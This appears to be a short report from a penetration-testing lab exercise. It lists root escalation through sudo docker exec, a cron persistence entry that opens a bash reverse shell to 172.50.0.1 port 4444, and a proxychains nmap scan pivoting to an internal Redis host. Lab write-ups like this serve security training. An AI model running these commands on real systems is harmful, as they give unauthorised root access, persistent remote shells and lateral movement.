# TLAB 8: Operation Deep Pivot - Intelligence Report

## Phase 1: The Beachhead & Escalation
- **Binary Found:** docker exec / /bin/sh
- **Escalation Command:** sudo docker exec -it bastion_web /bin/sh
- **Verification Output:** root

## Phase 2: Persistence
- **Cron Syntax:** * * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.50.0.1/4444 0>&1'

## Phase 3: The Pivot
- **Hidden Target IP:** 10.0.10.50
- **Open Port Identified:** 6379
- **Nmap Command:** proxychains nmap -sT -Pn -p- 10.0.10.50
